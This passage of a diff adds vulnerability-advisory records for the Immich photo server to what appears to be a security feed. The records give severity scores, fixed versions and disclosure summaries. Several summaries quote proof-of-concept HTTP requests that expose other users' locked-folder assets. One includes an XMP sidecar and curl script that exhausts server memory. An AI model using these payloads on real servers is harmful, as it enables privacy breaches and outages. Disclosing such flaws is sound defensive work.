A's elevated session.\r\n    if (visibility === AssetVisibility.Locked) {\r\n      return [auth.user.id];\r\n    }\r\n```\r\n\r\nFive callers pass `undefined` as soon as the caller's own session is elevated\r\n(`search.service.ts` lines 106, 128, 146, 161 and 193, each identical):\r\n\r\n```ts\r\nvisibility: dto.visibility ?? (auth.session?.hasElevatedPermission ? undefined : 'not-locked'),\r\n```\r\n\r\nSo for an elevated caller who omits the field there is no visibility filter, and\r\n`ownerId IN (self, ...partners)`. Every partner's locked asset matches.\r\n\r\nThe V3 builder gets this right, which is where the fix should come from:\r\n\r\n```ts\r\n// server/src/utils/database.ts:814-816\r\n      .where((eb) =>\r\n        eb.or([eb('asset.visibility', '!=', AssetVisibility.Locked), eb('asset.ownerId', '=', scope.lockedOwnerId)]),\r\n      )\r\n```\r\n\r\nThat predicate is unconditional and scoped to the requester, so a locked row survives only if the\r\nrequester owns it. Sending `\"filter\": {}` routes to V3 and returns nothing, while the same query\r\nwithout it leaks.\r\n\r\n### Proof of concept\r\n\r\nimmich v3.3.1 in Docker. A is the victim, B the partner. A uploads an asset, sets a PIN, unlocks,\r\nand sets the asset to `visibility: locked`. A shares with B. B turns it on in B's own timeline and\r\nunlocks B's own session with B's own PIN. B never learns A's PIN, and holds no admin role, no API\r\nkey and no share link.\r\n\r\n```http\r\nPOST /api/search/metadata\r\nAuthorization: Bearer <B, elevated session>\r\n\r\n{\"size\":200,\"withExif\":true}\r\n```\r\n\r\n```json\r\n{\"assets\":{\"total\":1,\"items\":[{\r\n  \"id\":\"fbf29e29-e631-486e-9b14-47c23fd31eb9\",\r\n  \"ownerId\":\"b99e2116-db06-4613-9199-3cecb4...",
+      "published_at": "2026-11-10T18:45:02.000Z",
+      "modified_at": "2026-11-10T18:45:02.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-v7v2-63g5-gwf7",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-v7v2-63g5-gwf7",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-v7v2-63g5-gwf7",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-xm8q-2hq2-gpxg",
+      "aliases": [],
+      "title": "A share link with uploads disabled can test whether the owner has a given file",
+      "summary": "### Summary\r\n\r\nAnyone with a share link URL can ask the server if the owner has a particular file. If the owner\r\nhas it, the server returns that file's asset ID. You need the file itself to ask, so this confirms a\r\nguess rather than finding something new.\r\n\r\nIt works on assets the link does not cover. That includes assets in the Locked Folder and assets in\r\nthe trash. The owner sees nothing.\r\n\r\nThe link does not need upload permission. `allowUpload` is `false` by default when a link is created\r\n(`server/src/schema/tables/shared-link.table.ts:38`), so this is the normal setup. A link password\r\ndoes not stop it.\r\n\r\nThe request is an upload call with no file attached:\r\n\r\n```\r\nPOST /api/assets?key=<link key>\r\nx-immich-checksum: <sha1 of the file>\r\nContent-Length: 0\r\n\r\n200 {\"status\":\"duplicate\",\"id\":\"f0b032ae-6c9f-495b-ba98-33cba14419b5\"}\r\n```\r\n\r\nThe same link sending a real file gets `401`.\r\n\r\n### Details\r\n\r\nFour methods in `server/src/services/asset-media.service.ts` can be reached from `POST /api/assets`.\r\nThree of them call `requireUploadAccess(auth)`:\r\n\r\n```\r\n 46:  async getUploadAssetIdByChecksum(...)    <- no check\r\n 60:    requireUploadAccess(auth);             canUploadFile\r\n 92:    requireUploadAccess(auth);             getUploadFilename\r\n105:    auth = requireUploadAccess(auth);      getUploadFolder\r\n```\r\n\r\nLine 46 is the one without the check. Line 46 is also the one a share link reaches.\r\n\r\nIt gets there through the interceptor. `server/src/controllers/asset-media.controller.ts:51-53`\r\nlists `AssetUploadInterceptor` before `FileUploadInterceptor`, so it runs first:\r\n\r\n```ts\r\n// server/src/middleware/asset-upload.interceptor.ts:18-25\r\nconst checksum = fromMaybeArray(req.headers[ImmichHeader.Checksum]);\r\nconst response = await this.service.getUploadAssetIdByChecksum(req.user, checksum);\r\nif (response) {\r\n  res.status(200);\r\n  return of({ status: AssetMediaStatus.DUPLICATE, id: response.id });\r\n}\r\n\r\nreturn next.handle();\r\n```\r\n\r\nWhen the checksum matches, it answers and never calls `next.handle()`. So `FileUploadInterceptor`\r\nand the controller handler never run. The upload checks are in those.\r\n\r\nThe query behind the lookup (`server/src/repositories/asset.repository.ts:683`) filters on `ownerId`\r\nand `libraryId is null`. Every asset the owner uploaded is in range. External library assets are\r\nnot.\r\n\r\nThis is the check that would stop it:\r\n\r\n```ts\r\n// server/src/utils/access.ts:41-46\r\nexport const requireUploadAccess = (auth: AuthDto | null): AuthDto => {\r\n  if (!auth || (auth.sharedLink && !auth.sharedLink.allowUpload)) {\r\n    throw new UnauthorizedException();\r\n  }\r\n  return auth;\r\n};\r\n```\r\n\r\n### Proof of concept\r\n\r\nimmich v3.3.1 in Docker. One owner with four assets: one in an album, one outside it, one in the\r\nLocked Folder, one in the trash. The album is shared with `allowUpload: false` and\r\n`allowDownload: false`. The link covers that album only.\r\n\r\nThe asset in the album is readable. The one outside it is not:\r\n\r\n```\r\nGET /api/assets/dfb3eb32-1b82-4837-951c-1db8b464150d?key=<key>   200\r\nGET /api/assets/f0b032ae-6c9f-495b-ba98-33cba14419b5?key=<key>   400 {\"message\":\"Not found or no asset.read access\"}\r\n```\r\n\r\nThe same link, asking by checksum:\r\n\r\n```\r\nPOST /api/assets?key=<key>   x-immich-checksum: d5b6ee825e3d29140cad6cd9e181167e6090dc3e\r\n  200 {\"status\":\"duplicate\",\"id\":\"f0b032ae-6c9f-495b-ba98-33cba14419b5\"}    outside the album\r\nPOST /api/assets?key=<key>   x-immich-checksum: 30e0cedb8fc8fe6deb239cf06b5aed8e054acecb\r\n  200 {\"status\":\"duplicate\",\"id\":\"a17be255-b684-45ee-aa39-4bd8822c04f6\"}    Locked Folder\r\nPOST /api/assets?key=<key>   x-immich-checksum: 1820c639b7ca6711a2992dc922adbf383a346dd2\r\n  200 {\"status\":\"duplicate\",\"id\":\"5ec503be-f1ac-4da7-baf3-4ab47b760323\"}    trash\r\n```\r\n\r\nTwo controls on the same link:\r\n\r\n```\r\nPOST /api/assets?key=<key>   multipart/form-data with a real file   401 {\"message\":\"Unauthorized\"}\r\nPOST /api/assets             checksum header, no key                401 {\"message\":\"Authen...",
+      "published_at": "2026-11-10T18:45:01.000Z",
+      "modified_at": "2026-11-10T18:45:01.000Z",
+      "severity": {
+        "level": "low",
+        "score": 3.1,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-862"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-xm8q-2hq2-gpxg",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-xm8q-2hq2-gpxg",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-xm8q-2hq2-gpxg",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:84c7adfb8a24481bbd0da3607a15bab31a125dec8c424cf3af2b31f0ae5988fb",
+      "note": null
+    },
+    {
+      "id": "GHSA-c9h4-ccvj-j2h2",
+      "aliases": [],
+      "title": "Unbounded motion-photo offset causes memory and disk exhaustion",
+      "summary": "### Summary\n\nAn authenticated, non-admin user can upload a JPEG with an XMP sidecar that claims the image contains an oversized motion-photo video. Negative padding makes Immich’s read position valid, but the server still allocates memory based on the unchecked  video length. It then saves the full buffer as a hidden video asset, amplifying a 20.9 KiB upload into 128 MiB of storage and about 480 MiB of server memory use in testing. Using larger values caused the host VM to crash.\n\n### Details\n\nAn authenticated, non-admin user can upload a 20.9 KiB JPEG with a crafted XMP sidecar. MicroVideoOffset=2147483647 makes Immich treat the video as nearly 2 GiB long. Negative container padding (-2147462747) makes the calculated read position zero, but Immich does not check that the claimed video length fits inside the JPEG. Immich allocates a buffer for the claimed length, then saves it as a hidden video asset.\r\n\r\nIn metadata.service.ts (immich-3.3.5/server/src/services/metadata.service.ts:696), Immich takes numeric MicroVideoOffset from the metadata as the video length. It calculates the read position as image size − length − padding, without checking that the requested range fits inside the image. A crafted negative ContainerDirectory.Item.Padding can make that position valid, while leaving the oversized length unchanged. Immich then allocates a buffer of that length with Buffer.alloc().\n\n### Proof of concept\n\n1-Deploy Immich and create a non-admin user account.\r\n2-Create a dummy JPEG with size of 310 bytes. The size of it could also be something else as long as position (position = image size - offset - padding) is equal to 0.\r\n3-Create the following sidecar:\r\n<?xpacket begin=\"﻿\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?>\r\n<x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"immich-audit\">\r\n  <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"\r\n    xmlns:Camera=\"http://ns.google.com/photos/1.0/camera/\"\r\n    xmlns:Container=\"http://ns.google.com/photos/1.0/container/\"\r\n    xmlns:Item=\"http://ns.google.com/photos/1.0/container/item/\">\r\n    <rdf:Description rdf:about=\"\"\r\n      Camera:MotionPhoto=\"1\"\r\n      Camera:MicroVideo=\"1\"\r\n      Camera:MicroVideoOffset=\"2147483647\">\r\n      <Container:Directory>\r\n        <rdf:Seq>\r\n          <rdf:li rdf:parseType=\"Resource\">\r\n            <Container:Item Item:Mime=\"image/jpeg\" Item:Semantic=\"Primary\" Item:Length=\"0\" />\r\n          </rdf:li>\r\n          <rdf:li rdf:parseType=\"Resource\">\r\n            <Container:Item Item:Mime=\"video/mp4\" Item:Semantic=\"MotionPhoto\" Item:Length=\"1\" Item:Padding=\"-2147483337\" />\r\n          </rdf:li>\r\n        </rdf:Seq>\r\n      </Container:Directory>\r\n    </rdf:Description>\r\n  </rdf:RDF>\r\n</x:xmpmeta>\r\n<?xpacket end=\"w\"?>\r\n4-Send the following request:\r\nset -o pipefail\r\nAPI='API LINK HERE'\r\nEMAIL='NON-ADMIN USER ACCOUNT EMAIL'\r\n\r\nread -r -s -p 'Password: ' IMMICH_PASSWORD\r\nprintf '\\n'\r\n\r\nTOKEN=\"$(jq -n --arg email \"$EMAIL\" --arg password \"$IMMICH_PASSWORD\" \\\r\n  '{email:$email,password:$password}' |\r\n  curl -fsS \"$API/auth/login\" \\\r\n    -H 'Content-Type: application/json' \\\r\n    --data-binary @- |\r\n  jq -r '.accessToken')\"\r\nunset IMMICH_PASSWORD\r\n\r\nSTAMP=\"$(date -u +'%Y-%m-%dT%H:%M:%S.000Z')\"\r\ncurl -fsS \"$API/assets\" \\\r\n  -H \"Authorization: Bearer $TOKEN\" \\\r\n  -F 'assetData=@motionphoto-finding-poc/dummy-image-2gb.jpg;type=image/jpeg' \\\r\n  -F 'sidecarData=@motionphoto-finding-poc/dummy-image-2gb.jpg.xmp;filename=dummy-image-2gb.jpg.xmp;type=application/rdf+xml' \\\r\n  -F \"fileCreatedAt=$STAMP\" \\\r\n  -F \"fileModifiedAt=$STAMP\" \\\r\n  -F 'filename=dummy-image-2gb.jpg'\r\n\r\nunset TOKEN\r\n\r\nDont forget to change the file names. You should be able to monitor memory usage. I managed to cause a crash with 2GBs. \n\n### Impact\n\nAn attacker with a normal user account can cause the host to go down.",
+      "published_at": "2026-11-10T18:44:59.000Z",
+      "modified_at": "2026-11-10T18:44:59.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-c9h4-ccvj-j2h2",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-c9h4-ccvj-j2h2",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-c9h4-ccvj-j2h2",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-qcp2-7vph-gq64",
+      "aliases": [],
+      "title": "Read-scoped API keys can reset cluster-group people data",
+      "summary": "### Summary\n\nAn API key granted only `clusterGroup.read` can submit the group-wide forced people reset\r\n(POST /api/cluster-groups/{id}/regenerate-people), although its scope excludes mutating\r\npermissions. With facial recognition enabled, the reset deletes person metadata (names,\r\nbirth dates, thumbnail files) for face groups left without faces. Verified live on v3.3.5.\n\n### Details\n\nAffected: immich v3.3.5 (current release); behavior present on main as reviewed 2026-10-27.\r\nClass: CWE-863 Incorrect Authorization - permission misclassification (the guard correctly\r\nenforces an incorrectly assigned permission).\r\nVector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N ≈ 4.3 (Medium).\r\n\r\nPOST /api/cluster-groups/{id}/regenerate-people - \"Forcefully re-run facial recognition for\r\nall faces of users in this group\" - is a destructive, group-wide operation. Its `force`\r\nbranch unassigns every ML-sourced face→person assignment in the cluster group, runs person\r\ncleanup, runs `VACUUM ANALYZE` + `REINDEX TABLE CONCURRENTLY` on `asset_face`/`person`, and\r\nre-queues recognition for the group's faces.\r\n\r\nThe route is annotated `@Authenticated({ permission: Permission.ClusterGroupRead })`, and\r\nAPI-key authorization enforces exactly that annotation\r\n(`isGranted({requested: [ClusterGroupRead], current: key.permissions})`,\r\nserver/src/services/auth.service.ts). So an API key granted only `clusterGroup.read` is\r\nauthorized to submit this destructive reset for the owner's entire cluster group. The\r\npermission system itself works - the same key is correctly denied ordinary mutations - the\r\ndefect is that a mutating endpoint carries a Read permission. The project's own advisory\r\nhistory treats API-key permission scoping as a security boundary (CVE-2026-23896 /\r\nGHSA-237r-x578-h5mv, fine-grained API-key permission escape).\r\n\r\nPrior-art note: group-wide member resets are an intentional feature (#30965) and their cost\r\nhas been publicly discussed (#32250). This report does not dispute that a full member's\r\nsession can reset their group. The boundary at issue is the credential scope: the relevant\r\nattacker holds only the restricted key.\r\n\r\nThe same root cause has a second consequence: `Permission.ClusterGroupRead` is also granted\r\nto pending invitees (`checkInviteAccess` in server/src/utils/access.ts), so an\r\ninvited-but-never-joined user can invoke the reset before becoming a member (dynamically\r\nconfirmed separately: 204 as invitee; outsider 400; unauthenticated 401).\r\n\r\n## Root cause\r\n\r\n- server/src/controllers/cluster-group.controller.ts - `regenerate-people` annotated\r\n  `Permission.ClusterGroupRead` (a mutating endpoint carrying a Read permission).\r\n- server/src/services/cluster-group.service.ts:75-82 - `regeneratePeople()` requires that\r\n  Read permission, then queues `FacialRecognitionQueueAll {clusterGroupId, force: true}`.\r\n- server/src/utils/access.ts - `ClusterGroupRead` also resolves for pending invitees\r\n  (`checkInviteAccess`), producing the secondary consequence above.\r\n- Contrast within the same controller: `ClusterGroupLeave`/`ClusterGroupRequestCreate` are\r\n  member-only - the Read treatment of the reset is inconsistent with its effect.\r\n\n\n### Proof of concept\n\nFresh-instance setup (official ghcr.io images, immich-server v3.3.5 + bundled postgres + redis;\r\nsteps all via the public API):\r\n1. POST /api/auth/admin-sign-up → admin account.\r\n2. POST /api/admin/users → regular member user (the future key owner); log in.\r\n3. Member uploads an asset (POST /api/assets) and creates a person (POST /api/people).\r\n4. Admin enables facial recognition: PUT /api/system-config (machineLearning.enabled: true;\r\n   sub-setting facialRecognition.enabled is true by default). In a stock deployment with the ML\r\n   container running, ML-sourced faces exist naturally; in our lab (no ML container) the face\r\n   rows were inserted directly in the database - disclosed as lab setup below, and not part of\r\n   the attack: the vulnerability is the API-key authoriza...",
+      "published_at": "2026-11-10T18:44:58.000Z",
+      "modified_at": "2026-11-10T18:44:58.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-qcp2-7vph-gq64",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-qcp2-7vph-gq64",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-qcp2-7vph-gq64",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-77439",
+      "aliases": [
+        "GHSA-c9mf-h82r-8p4j"
+      ],
+      "title": "Immich: Album Editor can escalate to Owner role and remove Owner-role members via unguarded API endpoints",
+      "summary": "Immich is a self-hosted photo and video management solution. Prior to 3.0.3, an authenticated user with editor access to a shared album can change the existing owner's role because album member role updates do not protect the owner from modification. By demoting the owner and then promoting themselves, an editor can take ownership of the album, remove the original owner, and delete the album. This vulnerability is fixed in version 3.0.3.",
+      "published_at": "2026-10-19T14:16:09.000Z",
+      "modified_at": "2026-11-09T17:28:02.232Z",
+      "severity": {
+        "level": "high",
+        "score": 8.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.006,
+        "percentile": 0.49306,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-269",
+        "CWE-639"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.0.3"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-c9mf-h82r-8p4j",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/pull/29883",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/commit/84dff19ca9a467752d848ff54763d62c04ebf960",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/releases/tag/v3.0.3",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-77439",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-77439",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-77439",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-77439",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-c9mf-h82r-8p4j",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-c9mf-h82r-8p4j",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:3dcd8c0003122dd21df36539435c539e549835865f8d659a0fb00716cfb9dbcb",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-119330",
+      "aliases": [
+        "GHSA-g4w3-c888-cr93"
+      ],
+      "title": "Immich: A regular user can create SharedLink for album/asset belonging to another user through CreateSharedLink API",
+      "summary": "Immich is a high-performance self-hosted photo and video management solution. Prior to 3.2.0, the shared-link creation API accepted albumId and assetIds as independent fields in server/src/services/shared-link.service.ts but authorized only the resource selected by the requested link type. An authenticated attacker who already knew a victim-owned asset UUID could select SharedLinkType.Album for an attacker-owned album while supplying that UUID in assetIds; SharedLinkService.create() persisted the unchecked association in shared_link_asset and made the victim asset available through the new anonymous shared-link credential. This exposed victim metadata, thumbnails, and the byte-identical original file and created a persistent sharing relationship that could be redistributed. This issue is fixed in version 3.2.0.",
+      "published_at": "2026-10-19T14:15:08.000Z",
+      "modified_at": "2026-11-05T02:35:58.181Z",
+      "severity": {
+        "level": "low",
+        "score": 3.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00222,
+        "percentile": 0.12875,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-285"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.2.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-g4w3-c888-cr93",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/pull/30762",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/commit/6a61901e79972bbfe5690636a995e156219b9a8f",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/releases/tag/v3.2.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-119330",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-119330",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-119330",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-119330",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-g4w3-c888-cr93",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-g4w3-c888-cr93",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:6ec3fa42f8f38e39b4d75fafb4bf9180bdef0329c03d6aebc5984a3449902df5",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-119328",
+      "aliases": [
+        "GHSA-72rm-x7xr-v679"
+      ],
+      "title": "Immich: Unauthenticated filesystem path injection (arbitrary directory write + recursive delete) in the machine-learning service",
+      "summary": "Immich is a high-performance self-hosted photo and video management solution. Prior to 3.3.0, the unauthenticated machine-learning /predict endpoint in machine-learning/immich_ml/main.py accepted an options object and passed its values into model construction in machine-learning/immich_ml/models/base.py without restricting security-sensitive parameters. An attacker with network access to the service could set cache_dir to an arbitrary writable path, causing model downloads to write there and causing clear_cache() to pass that path to shutil.rmtree() after selected model-loading failures. Depending on filesystem permissions and the selected path, this could modify files in mounted data locations or recursively delete an attacker-selected directory. The model-name allowlist prevents this issue from becoming arbitrary-model deserialization or code execution. This issue is fixed in version 3.3.0.",
+      "published_at": "2026-10-19T12:53:57.000Z",
+      "modified_at": "2026-11-06T17:38:35.404Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00436,
+        "percentile": 0.38426,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-22",
+        "CWE-73"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.3.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-72rm-x7xr-v679",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/pull/31856",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/commit/ab159b81182f26a8943f5dd66b719e8cdaad4626",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/releases/tag/v3.3.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-119328",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-119328",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-119328",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-119328",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-72rm-x7xr-v679",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-72rm-x7xr-v679",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:c97ca6b75ef34eaaeaceb46a39d5db5e06edc55c6f3cf7c7ee11d37767541b95",
+      "note": null
+    },
+    {
+      "id": "GHSA-3mh5-gqfm-phgj",
+      "aliases": [],
+      "title": "Cross-user disclosure of a user's Locked (hidden-vault) assets to a partner via timeline-bucket and search-statistics endpoints",
+      "summary": "Immich's **Locked folder** (hidden vault) is the most-private asset class: `visibility: locked` assets are hidden from the timeline and require the OWNER's PIN (an elevated session) to view. The code intends Locked assets to stay hidden even from PARTNERS - `timeBucketChecks` blocks Locked when `withPartners` is set, and `getUserIdsToSearch` carries the comment \"Locked assets are personal. Never include partner IDs, regardless of A's elevated session.\"\r\n\r\nTwo endpoints break that boundary: both authorize the Locked case using only the CALLER's own elevated session plus a partner-broad access grant, never binding the target `userId` to the caller. A partner (any low-trust sharing relationship) with their OWN PIN can read another user's hidden-vault asset IDs, GPS coordinates, blur previews, timestamps, and counts. Runtime-verified end-to-end against `ghcr.io/immich-app/immich-server:release` (v3.0.3).\r\n\r\n## Finding 1 (High) - partner reads victim's Locked timeline\r\n`GET /api/timeline/bucket` and `GET /api/timeline/buckets` (`@Authenticated({permission: AssetRead, sharedLink:true})`) → `server/src/services/timeline.service.ts` `timeBucketChecks`:\r\n```\r\nif (dto.visibility === AssetVisibility.Locked) { requireElevatedPermission(auth); }   // caller's OWN session only\r\n...\r\nif (dto.userId) {\r\n  await this.requireAccess({ auth, permission: Permission.TimelineRead, ids: [dto.userId] }); // partner-broad\r\n  if (dto.visibility === AssetVisibility.Archive) {\r\n    await this.requireAccess({ auth, permission: Permission.ArchiveRead, ids: [dto.userId] }); // Archive self-binds\r\n  } // NO equivalent self-bind for Locked\r\n}\r\n```\r\n`requireElevatedPermission` (`utils/access.ts`) validates only `auth.session?.hasElevatedPermission` - the ATTACKER's PIN session, not the owner of the target assets. `Permission.TimelineRead` admits partners (`access.timeline.checkPartnerAccess`). The Archive branch adds `ArchiveRead` (which only ever returns `auth.user.id`, self-restricting to the caller); Locked has no such guard. The repository then binds only `ownerId = dto.userId`, and `withDefaultVisibility` (which would exclude Locked) is skipped because `visibility` is passed explicitly.\r\n\r\nImpact: cross-user disclosure of the victim's PIN-locked hidden-vault asset IDs, per-bucket counts, and metadata - GPS latitude/longitude, city, country, a thumbhash blur preview, timestamps, aspect ratio, favorite/trashed status, live-photo id. The full image itself is NOT reachable (partner AssetRead/AssetView correctly exclude Locked), so it is bounded to metadata + location + preview of the most sensitive asset class.\r\n\r\nRuntime proof (v3.0.3), Alice=attacker, Bob=victim, Bob added Alice as partner, Bob's photo in Locked vault, Alice elevated her OWN session:\r\n```\r\n# control (boundary is real):\r\nAlice(elevated) GET /timeline/buckets?userId=<random-non-partner>&visibility=locked  -> 400 (denied)\r\n# attack:\r\nAlice(elevated,partner) GET /timeline/buckets?userId=<BOB>&visibility=locked   -> 200 [{\"timeBucket\":\"2026-01-01\",\"count\":1}]\r\nAlice(elevated,partner) GET /timeline/bucket?userId=<BOB>&visibility=locked&timeBucket=2026-01-01&withCoordinates=true\r\n   -> 200 { id:[<BOB's LOCKED asset>], visibility:[\"locked\"], ownerId:[BOB], city/country/latitude/longitude/thumbhash/... }\r\n# ceiling (image not reachable):\r\nAlice GET /assets/<id> -> 400; /assets/<id>/thumbnail -> 400; /assets/<id>/original -> 404\r\n```\r\n\r\n## Finding 2 (Low, same root cause) - partner leaks victim's Locked count via search statistics\r\n`POST /api/search/statistics` (`@Authenticated({permission: AssetStatistics})`) → `server/src/services/search.service.ts` `searchStatistics` calls `getUserIdsToSearch(auth)` WITHOUT `dto.visibility`, unlike its four siblings (`searchMetadata`/`searchRandom`/`searchLargeAssets`/`searchSmart`) which all pass it. `getUserIdsToSearch` only short-circuits to self-only `[auth.user.id]` when `visibility === Locked`; because visibility is omitted it falls through to `[auth.user....",
+      "published_at": "2026-10-19T12:53:19.000Z",
+      "modified_at": "2026-10-19T12:53:19.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
